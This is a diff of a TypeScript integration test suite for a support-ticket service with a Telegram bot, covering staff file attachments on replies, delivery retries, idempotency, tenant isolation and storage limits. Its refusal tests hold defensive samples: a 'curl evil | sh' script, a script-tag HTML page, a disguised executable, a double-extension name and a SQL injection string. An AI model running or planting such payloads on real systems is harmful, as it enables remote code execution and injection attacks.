@@ -3,7 +3,10 @@ import { createServer, type IncomingMessage, type Server, type ServerResponse } 
 import { sql } from 'drizzle-orm';
 import { afterAll, beforeAll, beforeEach, describe, expect, it } from 'vitest';
 import {
+  API_PREFIX,
+  AUTH_ROUTES,
   SESSION_COOKIE_NAME,
+  TICKET_ROUTES,
   TICKET_ATTACHMENT_MAX_BYTES,
   TICKET_MESSAGES_MAX_PER_TICKET,
   isNexaError,
@@ -17,11 +20,16 @@ import {
 import { CATALOGUE_FA } from '@nexa/i18n';
 import { TicketsController } from '../../apps/api/src/surfaces/web/tickets.controller';
 import { RECEIPT_CAPTURE_LOCK_CLASS } from '../../apps/api/src/modules/commerce/payments/infrastructure/drizzle-receipt.repository';
+import { createApiApp, type ApiApp } from '../../apps/api/src/bootstrap';
+import { seed } from '../../apps/api/src/infrastructure/persistence/seed';
 import {
   adminActorFor,
   createAdmin,
   createTestContext,
+  migrateOnce,
+  resetDatabase,
   SEED_IDS,
+  testConfig,
   tenantA,
   tenantB,
   type SeededAdmin,
@@ -80,6 +88,8 @@ const OPEN_ROUTE: PaymentGatewayConfig = {
 interface Sent {
   readonly url: string;
   readonly body: Record<string, unknown>;
+  /** The request's bytes as sent: a multipart upload's file is compared against these. */
+  readonly raw: Buffer;
 }
 
 /** How the stand-in answers the next customer sends: normally, refused, rate-limited or 5xx. */
@@ -90,6 +100,9 @@ describe('WP-A7 — support tickets', () => {
   let telegram: Server;
   let sent: Sent[];
   let mode: Mode = 'OK';
+  /** HF-A7: how the stand-in answers a `sendPhoto` / `sendDocument` upload, apart from text. */
+  let fileMode: Mode = 'OK';
+  let uploadSeq = 0;
   let customer: UserId;
   let other: UserId;
   let owner: SeededAdmin;
@@ -107,14 +120,15 @@ describe('WP-A7 — support tickets', () => {
           response.end(Buffer.from('%PDF-1.4 ticket'));
           return;
         }
-        const raw = Buffer.concat(chunks).toString('utf8');
+        const bytes = Buffer.concat(chunks);
+        const raw = bytes.toString('utf8');
         let body: Record<string, unknown>;
         try {
           body = JSON.parse(raw) as Record<string, unknown>;
         } catch {
           body = { unparseable: raw };
         }
-        sent.push({ url, body });
+        sent.push({ url, body, raw: bytes });
         if (url.endsWith('/getFile')) {
           response.writeHead(200, { 'content-type': 'application/json' });
           response.end(
@@ -125,13 +139,33 @@ describe('WP-A7 — support tickets', () => {
           );
           return;
         }
-        if (url.endsWith('/sendMessage') && mode !== 'OK') {
-          if (mode === 'REFUSE') {
+        const upload = url.endsWith('/sendPhoto') || url.endsWith('/sendDocument');
+        // HF-A7: an accepted upload answers with the file as Telegram now holds it.
+        if (upload && fileMode === 'OK') {
+          uploadSeq += 1;
+          const file = {
+            file_id: `sent-file-${String(uploadSeq)}`,
+            file_unique_id: `u-sent-file-${String(uploadSeq)}`,
+          };
+          response.writeHead(200, { 'content-type': 'application/json' });
+          response.end(
+            JSON.stringify({
+              ok: true,
+              result: url.endsWith('/sendPhoto')
+                ? { message_id: 12, photo: [{ file_id: 'thumb', file_unique_id: 'u-thumb' }, file] }
+                : { message_id: 12, document: file },
+            }),
+          );
+          return;
+        }
+        const failing = upload ? fileMode : url.endsWith('/sendMessage') ? mode : 'OK';
+        if (failing !== 'OK') {
+          if (failing === 'REFUSE') {
             response.writeHead(400, { 'content-type': 'application/json' });
             response.end(
               JSON.stringify({ ok: false, error_code: 400, description: 'Bad Request' }),
             );
-          } else if (mode === 'RATE_LIMIT') {
+          } else if (failing === 'RATE_LIMIT') {
             response.writeHead(429, { 'content-type': 'application/json' });
             response.end(
               JSON.stringify({ ok: false, error_code: 429, parameters: { retry_after: 1 } }),
@@ -165,6 +199,7 @@ describe('WP-A7 — support tickets', () => {
     ctx.container.setInstallationTenant(tenantA.tenantId);
     sent = [];
     mode = 'OK';
+    fileMode = 'OK';
     owner = await createAdmin(ctx.container, tenantA, {
       username: 'owner-tickets',
       roleKeys: ['owner'],
@@ -1464,6 +1499,453 @@ describe('WP-A7 — support tickets', () => {
     expect(await state()).toEqual({ status: 'CLOSED', messages: 3 });
   });
 
+  // ===========================================================================
+  // HF-A7: support's file on a reply
+  // ===========================================================================
+
+  const PNG = Buffer.concat([
+    Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]),
+    Buffer.from('support-screenshot-body'),
+  ]);
+  const PDF = Buffer.from('%PDF-1.7\nراهنمای اتصال\n%%EOF\n');
+  const EXE = Buffer.concat([Buffer.from('MZ'), Buffer.alloc(64, 0x90)]);
+  const fileOf = (fileName: string, mimeType: string, bytes: Buffer) => ({
+    fileName,
+    mimeType,
+    contentBase64: bytes.toString('base64'),
+  });
+  const uploads = () => sent.filter((one) => /\/send(Photo|Document)$/u.test(one.url));
+
+  /** The attachment route's answer: its headers and its bytes. */
+  async function download(
+    web: Awaited<ReturnType<typeof webAs>>,
+    messageId: string,
+  ): Promise<{ headers: Record<string, string>; body: Buffer }> {
+    const headers: Record<string, string> = {};
+    let body: Buffer = Buffer.alloc(0);
+    const reply = {
+      header(name: string, value: string) {
+        headers[name] = value;
+        return reply;
+      },
+      async send(bytes: Buffer) {
+        body = bytes;
+        return reply;
+      },
+    } as unknown as FastifyReply;
+    await web.controller.attachment(web.request, reply, messageId);
+    return { headers, body };
+  }
+
+  const fileRow = async (messageId: string) =>
+    (
+      await rows<{
+        staged: boolean;
+        telegram_file_id: string | null;
+        purged: boolean;
+        file_name: string;
+        byte_length: number;
+      }>(
+        sql`SELECT content IS NOT NULL AS staged, telegram_file_id, purged_at IS NOT NULL AS purged,
+                   file_name, byte_length
+              FROM ticket_reply_files WHERE message_id = ${messageId}`,
+      )
+    )[0];
+  const laneOf = async (messageId: string) =>
+    rows<{ kind: string; state: string; attempts: number }>(
+      sql`SELECT kind, state, attempts FROM customer_notifications
+           WHERE subject_id = ${messageId} ORDER BY created_at, id`,
+    );
+
+  it('sends support’s file beside the reply from bounded staging, and lets the bytes go once Telegram has them', async () => {
+    const ticketId = await openThroughBot('اتصال برقرار نمی‌شود');
+    const web = await webAs(owner);
+    const reply = await web.controller.reply(web.request, ticketId, {
+      idempotencyKey: 'reply-with-photo-1',
+      text: 'این تصویر تنظیمات درست است.',
+      attachment: fileOf('C:\\fakepath\\screen.PNG', 'image/png', PNG),
+    });
+    // The message is written, with its file, before anything is sent.
+    expect(reply.message).toMatchObject({
+      senderType: 'ADMIN',
+      body: 'این تصویر تنظیمات درست است.',
+      attachment: {
+        kind: 'PHOTO',
+        mimeType: 'image/png',
+        fileName: 'screen.png',
+        fileSize: PNG.byteLength,
+      },
+      delivery: 'PENDING',
+      attachmentDelivery: 'PENDING',
+    });
+    expect(await fileRow(reply.message.id)).toEqual({
+      staged: true,
+      telegram_file_id: null,
+      purged: false,
+      file_name: 'screen.png',
+      byte_length: PNG.byteLength,
+    });
+    // Two lane rows naming the message, the text's first; neither carries the bytes.
+    expect(await laneOf(reply.message.id)).toEqual([
+      { kind: 'TICKET_REPLY', state: 'PENDING', attempts: 0 },
+      { kind: 'TICKET_REPLY_ATTACHMENT', state: 'PENDING', attempts: 0 },
+    ]);
+    // Support reads its own staged file back through the attachment route.
+    const staged = await download(web, reply.message.id);
+    expect(staged.body.equals(PNG)).toBe(true);
+    expect(staged.headers['content-type']).toBe('application/octet-stream');
+    expect(JSON.stringify(await web.controller.detail(web.request, ticketId))).not.toContain(
+      PNG.toString('base64'),
+    );
+
+    sent = [];
+    await deliver();
+    const toCustomer = sent.filter((one) => one.raw.includes(Buffer.from(CUSTOMER_TG)));
+    expect(toCustomer.map((one) => one.url.split('/').at(-1))).toEqual([
+      'sendMessage',
+      'sendPhoto',
+    ]);
+    const photo = toCustomer[1]!;
+    // The verified bytes, under the clean name, with the ticket in the caption.
+    expect(photo.raw.includes(PNG)).toBe(true);
+    expect(photo.raw.toString('utf8')).toContain('filename="screen.png"');
+    expect(photo.raw.toString('utf8')).toContain('Content-Type: image/png');
+    const detail = await web.controller.detail(web.request, ticketId);
+    expect(photo.raw.toString('utf8')).toContain(`#${String(detail.ticket.number)}`);
+
+    // Delivered: Telegram's handle stamped, the bytes cleared, in the same transaction.
+    expect(detail.messages.at(-1)).toMatchObject({
+      delivery: 'DELIVERED',
+      attachmentDelivery: 'DELIVERED',
+    });
+    expect(await fileRow(reply.message.id)).toMatchObject({
+      staged: false,
+      telegram_file_id: 'sent-file-1',
+      purged: true,
+    });
+    // From here support reads it back from Telegram, with the ticket's bot; no id leaks.
+    sent = [];
+    const fetched = await download(web, reply.message.id);
+    expect(String(fetched.body)).toBe('%PDF-1.4 ticket');
+    expect(sent.find((one) => one.url.endsWith('/getFile'))?.body).toEqual({
+      file_id: 'sent-file-1',
+    });
+    expect(JSON.stringify(await web.controller.detail(web.request, ticketId))).not.toContain(
+      'sent-file-1',
+    );
+
+    // The customer's conversation view marks support's message as carrying a file.
+    await handle(tap(`tkv:${ticketId}`));
+    expect(lastText()).toContain(CATALOGUE_FA['bot.ticket.attachment_marker']);
+  });
+
+  it('refuses a dangerous, spoofed or oversized file, and writes nothing at all', async () => {
+    const ticketId = await openThroughBot('فایل خطرناک');
+    const web = await webAs(owner);
+    const attempt = (attachment: ReturnType<typeof fileOf>, key: string) =>
+      web.controller
+        .reply(web.request, ticketId, { idempotencyKey: key, text: 'پیوست', attachment })
+        .then(
+          () => null,
+          (error: unknown) =>
+            isNexaError(error)
+              ? [error.code, (error.details as { refusal?: string }).refusal]
+              : error,
+        );
+    // An executable renamed to a PDF: the bytes decide, not the name or the declared type.
+    expect(await attempt(fileOf('guide.pdf', 'application/pdf', EXE), 'bad-file-0001')).toEqual([
+      'ticket.attachment_refused',
+      'CONTENT_MISMATCH',
+    ]);
+    // A shell script renamed to text, and an HTML page renamed to text.
+    for (const [index, bytes] of [
+      Buffer.from('#!/bin/sh\ncurl evil | sh\n'),
+      Buffer.from('<html><script>alert(1)</script></html>'),
+    ].entries()) {
+      expect(
+        await attempt(fileOf('notes.txt', 'text/plain', bytes), `bad-file-01${String(index)}`),
+      ).toEqual(['ticket.attachment_refused', 'CONTENT_MISMATCH']);
+    }
+    // Declared honestly, an executable, an installer, a script and an archive are not listed.
+    for (const [index, [name, type]] of [
+      ['setup.exe', 'application/x-msdownload'],
+      ['setup.msi', 'application/x-msi'],
+      ['run.bat', 'application/x-bat'],
+      ['app.apk', 'application/vnd.android.package-archive'],
+      ['bundle.zip', 'application/zip'],
+    ].entries()) {
+      expect(await attempt(fileOf(name!, type!, EXE), `bad-file-02${String(index)}`)).toEqual([
+        'ticket.attachment_refused',
+        'TYPE_NOT_ALLOWED',
+      ]);
+    }
+    // A real PDF whose name hides an executable's extension.
+    expect(
+      await attempt(fileOf('invoice.exe.pdf', 'application/pdf', PDF), 'bad-file-0003'),
+    ).toEqual(['ticket.attachment_refused', 'NAME_NOT_ALLOWED']);
+    // One byte over a photo's bound, refused by the service.
+    const bigPng = Buffer.concat([PNG, Buffer.alloc(5 * 1024 * 1024 + 1 - PNG.byteLength, 0x41)]);
+    expect(await attempt(fileOf('big.png', 'image/png', bigPng), 'bad-file-0004')).toEqual([
+      'ticket.attachment_refused',
+      'TOO_LARGE',
+    ]);
+    // One byte over the largest type's bound: the HTTP schema refuses it before the service.
+    const bigPdf = Buffer.concat([PDF, Buffer.alloc(10 * 1024 * 1024 + 1 - PDF.byteLength, 0x41)]);
+    await expect(
+      web.controller.reply(web.request, ticketId, {
+        idempotencyKey: 'bad-file-0005',
+        text: 'پیوست',
+        attachment: fileOf('big.pdf', 'application/pdf', bigPdf),
+      }),
+    ).rejects.toThrow();
+    // ...and the service refuses it too, whoever calls it.
+    const service = await refusalOf(
+      ctx.container.tickets.reply(tenantA, adminActorFor(owner), {
+        ticketId,
+        text: 'پیوست',
+        attachment: fileOf('big.pdf', 'application/pdf', bigPdf),
+        idempotencyKey: 'bad-file-0006',
+      }),
+    );
+    expect(service.code).toBe('ticket.attachment_refused');
+
+    // Nothing was written: no message, no staged file, no notification, no status change.
+    expect(
+      await count(sql`SELECT count(*)::int AS n FROM ticket_messages WHERE sender_type = 'ADMIN'`),
+    ).toBe(0);
+    expect(await count(sql`SELECT count(*)::int AS n FROM ticket_reply_files`)).toBe(0);
+    expect(await count(sql`SELECT count(*)::int AS n FROM customer_notifications`)).toBe(0);
+    expect((await web.controller.detail(web.request, ticketId)).ticket.status).toBe('OPEN');
+  });
+
+  it('keeps the reply and its file when Telegram refuses the upload, retries it, and never re-sends an unknown one', async () => {
+    const ticketId = await openThroughBot('ارسال ناموفق');
+    const web = await webAs(owner);
+
+    // Telegram refuses the upload: the text arrives, the file stays PENDING with its bytes.
+    fileMode = 'REFUSE';
+    const refused = await web.controller.reply(web.request, ticketId, {
+      idempotencyKey: 'file-refused-01',
+      text: 'راهنما پیوست است.',
+      attachment: fileOf('guide.pdf', 'application/pdf', PDF),
+    });
+    await deliver();
+    expect(await laneOf(refused.message.id)).toEqual([
+      { kind: 'TICKET_REPLY', state: 'DELIVERED', attempts: 1 },
+      { kind: 'TICKET_REPLY_ATTACHMENT', state: 'PENDING', attempts: 1 },
+    ]);
+    expect(await fileRow(refused.message.id)).toMatchObject({ staged: true, purged: false });
+
+    // A rate limit spends no attempt.
+    fileMode = 'RATE_LIMIT';
+    await deliver();
+    expect((await laneOf(refused.message.id))[1]).toMatchObject({
+      state: 'PENDING',
+      attempts: 1,
+    });
+
+    // Telegram recovers: the document goes once, and only the document.
+    fileMode = 'OK';
+    sent = [];
+    await deliver();
+    expect(uploads().map((one) => one.url.split('/').at(-1))).toEqual(['sendDocument']);
+    expect(uploads()[0]!.raw.includes(PDF)).toBe(true);
+    expect(messages()).toHaveLength(0);
+    expect(await fileRow(refused.message.id)).toMatchObject({ staged: false, purged: true });
+
+    // An unknown outcome: UNCONFIRMED, never uploaded again — and the reply and its file stay.
+    fileMode = 'SERVER_ERROR';
+    const unknown = await web.controller.reply(web.request, ticketId, {
+      idempotencyKey: 'file-unknown-01',
+      text: 'پیوست دوم',
+      attachment: fileOf('second.pdf', 'application/pdf', PDF),
+    });
+    await deliver();
+    fileMode = 'OK';
+    sent = [];
+    await deliver();
+    expect(uploads()).toHaveLength(0);
+    const detail = await web.controller.detail(web.request, ticketId);
+    expect(detail.messages.find((one) => one.id === unknown.message.id)).toMatchObject({
+      body: 'پیوست دوم',
+      delivery: 'DELIVERED',
+      attachmentDelivery: 'UNCONFIRMED',
+      attachment: { kind: 'DOCUMENT', fileName: 'second.pdf' },
+    });
+    // Support still has the file it sent, from staging.
+    expect((await download(web, unknown.message.id)).body.equals(PDF)).toBe(true);
+  });
+
+  it('stages and sends one file per key, and refuses the key reused with another file', async () => {
+    const ticketId = await openThroughBot('دوبار کلیک');
+    const web = await webAs(owner);
+    const request = {
+      idempotencyKey: 'file-replay-001',
+      text: 'یک پاسخ با یک فایل',
+      attachment: fileOf('screen.png', 'image/png', PNG),
+    };
+    const first = await web.controller.reply(web.request, ticketId, request);
+    const again = await web.controller.reply(web.request, ticketId, request);
+    expect(again.message.id).toBe(first.message.id);
+    expect(await count(sql`SELECT count(*)::int AS n FROM ticket_reply_files`)).toBe(1);
+    expect(await laneOf(first.message.id)).toHaveLength(2);
+    sent = [];
+    await deliver();
+    // Replayed after delivery, the reply answers with where the file actually got.
+    const late = await web.controller.reply(web.request, ticketId, request);
+    expect(late.message).toMatchObject({ id: first.message.id, attachmentDelivery: 'DELIVERED' });
+    await deliver();
+    expect(uploads()).toHaveLength(1);
+
+    const reused = await refusalOf(
+      web.controller.reply(web.request, ticketId, {
+        ...request,
+        attachment: fileOf('other.pdf', 'application/pdf', PDF),
+      }),
+    );
+    expect(reused.code).toBe('platform.idempotency_payload_mismatch');
+    // The same words with no file is a different command too.
+    const withoutFile = await refusalOf(
+      web.controller.reply(web.request, ticketId, {
+        idempotencyKey: request.idempotencyKey,
+        text: request.text,
+      }),
+    );
+    expect(withoutFile.code).toBe('platform.idempotency_payload_mismatch');
+    expect(await count(sql`SELECT count(*)::int AS n FROM ticket_reply_files`)).toBe(1);
+  });
+
+  it('keeps support’s files to their tenant, bounds each tenant’s staging, and clears what Telegram never took', async () => {
+    const ticketId = await openThroughBot('فضای ذخیره');
+    const web = await webAs(owner);
+    const actorA = adminActorFor(owner);
+
+    // A real reply whose file is never delivered, before the tenant's staging fills up.
+    const waiting = await web.controller.reply(web.request, ticketId, {
+      idempotencyKey: 'staged-wait-01',
+      text: 'این پیوست منتظر می‌ماند',
+      attachment: fileOf('wait.pdf', 'application/pdf', PDF),
+    });
+    // Ten more replies, each holding a file at the PDF bound: the tenant's staging is full.
+    for (let index = 0; index < 10; index += 1) {
+      await ctx.container.tickets.reply(tenantA, actorA, {
+        ticketId,
+        text: `پاسخ ${String(index)}`,
+        idempotencyKey: `staged-fill-${String(index)}`,
+      });
+    }
+    await ctx.container.database.db.execute(sql`
+      INSERT INTO ticket_reply_files
+        (tenant_id, message_id, ticket_id, bot_instance_id, kind, mime_type, file_name,
+         byte_length, sha256, content)
+      SELECT m.tenant_id, m.id, m.ticket_id, ${BOT_A}, 'DOCUMENT', 'application/pdf', 'big.pdf',
+             10485760, repeat('a', 64), convert_to(repeat('A', 10485760), 'UTF8')
+        FROM ticket_messages m
+       WHERE m.ticket_id = ${ticketId} AND m.sender_type = 'ADMIN' AND m.body LIKE 'پاسخ %'`);
+    const full = await refusalOf(
+      web.controller.reply(web.request, ticketId, {
+        idempotencyKey: 'staged-full-01',
+        text: 'یکی دیگر',
+        attachment: fileOf('screen.png', 'image/png', PNG),
+      }),
+    );
+    expect(full.code).toBe('ticket.attachment_storage_full');
+    expect(
+      await count(sql`SELECT count(*)::int AS n FROM ticket_messages WHERE body = 'یکی دیگر'`),
+    ).toBe(0);
+
+    // Another tenant: its own staging, and none of tenant A's files.
+    const foreignOwner = await createAdmin(ctx.container, tenantB, {
+      username: 'owner-b-files',
+      roleKeys: ['owner'],
+    });
+    const actorB = adminActorFor(foreignOwner);
+    const foreign = await resolve(FOREIGN_TG, 'بیگانه', true);
+    const categoryB = await ctx.container.ticketCategories.create(tenantB, actorB, {
+      idempotencyKey: 'category-b-files',
+      title: 'دستهٔ ب',
+      sortOrder: 1,
+    });
+    const openedB = await ctx.container.tickets.openByCustomer(tenantB, systemActor('b'), {
+      customerId: foreign,
+      botInstanceId: BOT_B,
+      categoryId: categoryB.category.id,
+      text: 'تیکت مستأجر ب',
+      file: null,
+      idempotencyKey: 'open-b-files',
+    });
+    const replyB = await ctx.container.tickets.reply(tenantB, actorB, {
+      ticketId: openedB.ticket.id,
+      text: 'پاسخ ب',
+      attachment: fileOf('screen.png', 'image/png', PNG),
+      idempotencyKey: 'reply-b-files',
+    });
+    const [rowB] = await rows<{ tenant_id: string; bot_instance_id: string }>(
+      sql`SELECT tenant_id, bot_instance_id FROM ticket_reply_files
+           WHERE message_id = ${replyB.message.id}`,
+    );
+    expect(rowB).toEqual({ tenant_id: tenantB.tenantId, bot_instance_id: BOT_B });
+    // Tenant B can neither read tenant A's file nor post one into tenant A's ticket.
+    expect(
+      (await refusalOf(ctx.container.tickets.attachmentOf(tenantB, actorB, waiting.message.id)))
+        .code,
+    ).toBe('ticket.attachment_unavailable');
+    expect(
+      (
+        await refusalOf(
+          ctx.container.tickets.reply(tenantB, actorB, {
+            ticketId,
+            text: 'از بیرون',
+            attachment: fileOf('x.png', 'image/png', PNG),
+            idempotencyKey: 'foreign-file-01',
+          }),
+        )
+      ).code,
+    ).toBe('ticket.not_found');
+    // ...and tenant A cannot read tenant B's.
+    expect(
+      (await refusalOf(ctx.container.tickets.attachmentOf(tenantA, actorA, replyB.message.id)))
+        .code,
+    ).toBe('ticket.attachment_unavailable');
+
+    // A week on, the retention sweep clears what Telegram never took; the rows stay.
+    await ctx.container.database.db.execute(
+      sql`UPDATE ticket_reply_files SET created_at = now() - interval '8 days'
+           WHERE tenant_id = ${tenantA.tenantId}`,
+    );
+    expect(await ctx.container.ticketReplyFileSweeper.sweep()).toBe(11);
+    expect(
+      await count(
+        sql`SELECT count(*)::int AS n FROM ticket_reply_files
+             WHERE content IS NULL AND purged_at IS NOT NULL AND tenant_id = ${tenantA.tenantId}`,
+      ),
+    ).toBe(11);
+    // Tenant B's fresh file is not A's retention's business.
+    expect(await fileRow(replyB.message.id)).toMatchObject({ staged: true });
+
+    // The waiting file's delivery now finds nothing to send, and fails rather than guess.
+    sent = [];
+    await deliver();
+    expect(uploads()).toHaveLength(0);
+    expect((await laneOf(waiting.message.id)).map((one) => [one.kind, one.state])).toEqual([
+      ['TICKET_REPLY', 'DELIVERED'],
+      ['TICKET_REPLY_ATTACHMENT', 'FAILED'],
+    ]);
+    const detail = await web.controller.detail(web.request, ticketId);
+    expect(detail.messages.find((one) => one.id === waiting.message.id)).toMatchObject({
+      body: 'این پیوست منتظر می‌ماند',
+      attachment: { kind: 'DOCUMENT', fileName: 'wait.pdf' },
+      attachmentDelivery: 'FAILED',
+    });
+    // Staging has room again.
+    const after = await web.controller.reply(web.request, ticketId, {
+      idempotencyKey: 'staged-after-01',
+      text: 'اکنون جا هست',
+      attachment: fileOf('screen.png', 'image/png', PNG),
+    });
+    expect(after.message.attachmentDelivery).toBe('PENDING');
+  });
+
   it('answers a malformed category id with not-found, never a database error', async () => {
     const web = await webAs(owner);
     for (const id of ['not-a-uuid', '1', "' OR 1=1 --"]) {
@@ -1478,5 +1960,111 @@ describe('WP-A7 — support tickets', () => {
         404,
       ]);
     }
+  });
+});
+
+/**
+ * HF-A7: support's file as the Web Admin sends it — base64 inside the reply's JSON, through
+ * Fastify's own body reader. The adapter's default limit is one mebibyte, so without the
+ * route's own ceiling every file above about 768 KiB would be refused with a 413 before the
+ * schema or the service ever saw it.
+ */
+describe('HF-A7 — support’s file over HTTP', () => {
+  const ORIGIN = 'https://admin.example.test';
+  let api: ApiApp;
+  let cookie: string;
+  let ticketId: string;
+
+  const inject = (options: Record<string, unknown>) =>
+    api.app
+      .getHttpAdapter()
+      .getInstance()
+      .inject(options as never);
+
+  beforeAll(async () => {
+    const config = testConfig({ WEB_ADMIN_ORIGINS: ORIGIN });
+    await migrateOnce(config.DATABASE_URL);
+    api = await createApiApp(config);
+  }, 120_000);
+
+  afterAll(async () => {
+    await api?.close();
+  });
+
+  beforeEach(async () => {
+    await resetDatabase(api.container.database.db);
+    await seed(api.container.database.db, api.container.cipher);
+    api.container.setInstallationTenant(tenantA.tenantId);
+    const owner = await createAdmin(api.container, tenantA, {
+      username: 'owner-ticket-http',
+      password: 'the-owners-real-password',
+      roleKeys: ['owner'],
+    });
+    const login = await inject({
+      method: 'POST',
+      url: `${API_PREFIX}${AUTH_ROUTES.login}`,
+      headers: { origin: ORIGIN },
+      payload: { username: 'owner-ticket-http', password: 'the-owners-real-password' },
+    });
+    const match = new RegExp(`${SESSION_COOKIE_NAME}=([^;]+)`).exec(
+      String(login.headers['set-cookie'] ?? ''),
+    );
+    if (match === null) throw new Error('No session cookie.');
+    cookie = `${SESSION_COOKIE_NAME}=${match[1] as string}`;
+    const resolved = await api.container.customers.resolveFromUpdate(tenantA, systemActor('h'), {
+      idempotencyKey: 'resolve-ticket-http',
+      telegramUserId: CUSTOMER_TG,
+      from: { id: Number(CUSTOMER_TG), first_name: 'مریم' },
+      botInstanceId: BOT_A,
+    });
+    const category = await api.container.ticketCategories.create(tenantA, adminActorFor(owner), {
+      idempotencyKey: 'category-ticket-http',
+      title: 'پیوست',
+      sortOrder: 1,
+    });
+    const opened = await api.container.tickets.openByCustomer(tenantA, systemActor('h'), {
+      customerId: resolved.customer.id,
+      botInstanceId: BOT_A,
+      categoryId: category.category.id,
+      text: 'تیکت برای پیوست',
+      file: null,
+      idempotencyKey: 'open-ticket-http',
+    });
+    ticketId = opened.ticket.id;
+  });
+
+  const pdf = (size: number) => {
+    const bytes = Buffer.alloc(size, 0x41);
+    Buffer.from('%PDF-1.7\n').copy(bytes);
+    return bytes;
+  };
+  const reply = (bytes: Buffer, idempotencyKey: string) =>
+    inject({
+      method: 'POST',
+      url: `${API_PREFIX}${TICKET_ROUTES.reply(ticketId)}`,
+      headers: { origin: ORIGIN, cookie },
+      payload: {
+        idempotencyKey,
+        text: 'راهنمای کامل پیوست است.',
+        attachment: {
+          fileName: 'guide.pdf',
+          mimeType: 'application/pdf',
+          contentBase64: bytes.toString('base64'),
+        },
+      },
+    });
+
+  it('accepts a file at the largest type’s bound, and refuses one past it by the schema, never by the body reader', async () => {
+    const atBound = await reply(pdf(10 * 1024 * 1024), 'http-file-at-bound');
+    expect(atBound.statusCode, atBound.body.slice(0, 300)).toBe(201);
+    expect(
+      (atBound.json() as { message: { attachment: { fileSize: number } } }).message.attachment
+        .fileSize,
+    ).toBe(10 * 1024 * 1024);
+
+    const past = await reply(pdf(10 * 1024 * 1024 + 1), 'http-file-past-bound');
+    // 400 from the contract's own bound — a validation refusal, not the adapter's 413.
+    expect(past.statusCode, past.body.slice(0, 300)).toBe(400);
+    expect(past.body).toContain('"kind":"VALIDATION"');
   });
 });
